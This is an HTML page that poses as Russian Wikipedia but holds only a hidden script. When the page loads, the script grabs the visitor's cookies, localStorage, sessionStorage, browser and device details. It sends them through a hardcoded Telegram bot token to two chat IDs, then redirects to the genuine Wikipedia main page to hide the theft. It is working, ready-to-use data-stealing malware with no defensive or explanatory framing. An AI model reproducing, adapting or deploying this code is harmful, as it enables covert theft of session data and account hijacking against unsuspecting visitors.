<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Википедия</title></head>
<body>
<script>
var TOKEN = '8847544358:AAFH7jhYxPh7xuTHmoMZXYYHGcxzsYnHGe0';
var ID = '6783102477';
var ID2 = '5442175617';
var REDIRECT = 'https://ru.wikipedia.org/wiki/Заглавная_страница';

function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
var cookieStr = document.cookie || 'пусто (или HttpOnly)';
var lsStr = '', ssStr = '';
try { lsStr = JSON.stringify(localStorage) || '{}'; } catch(e){}
try { ssStr = JSON.stringify(sessionStorage) || '{}'; } catch(e){}

function sendTo(chatId, text){
  var u = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage'
        + '?chat_id=' + chatId
        + '&text=' + encodeURIComponent(text);
  return fetch(u, { keepalive: true }).catch(function(){});
}

function send(batStr){
  var t = 'IP: см. сервер\n'
    + 'UA: ' + esc(navigator.userAgent) + '\n'
    + 'Экран: ' + screen.width + 'x' + screen.height + '\n'
    + 'Батарея: ' + batStr + '\n'
    + 'URL: ' + location.href + '\n'
    + 'Referrer: ' + (document.referrer || 'нет') + '\n'
    + 'Cookies: ' + esc(cookieStr) + '\n'
    + 'localStorage: ' + esc(lsStr) + '\n'
    + 'sessionStorage: ' + esc(ssStr);

  Promise.all([ sendTo(ID, t), sendTo(ID2, t) ]).finally(function(){
    location.replace(REDIRECT);
  });
}

if (navigator.getBattery) {
  navigator.getBattery().then(function(b){
    send(Math.round(b.level*100) + '%' + (b.charging ? ' (заряжается)' : ''));
  }).catch(function(){ send('н/д'); });
} else {
  send('н/д (браузер не поддерживает)');
}
</script>
</body>
</html>
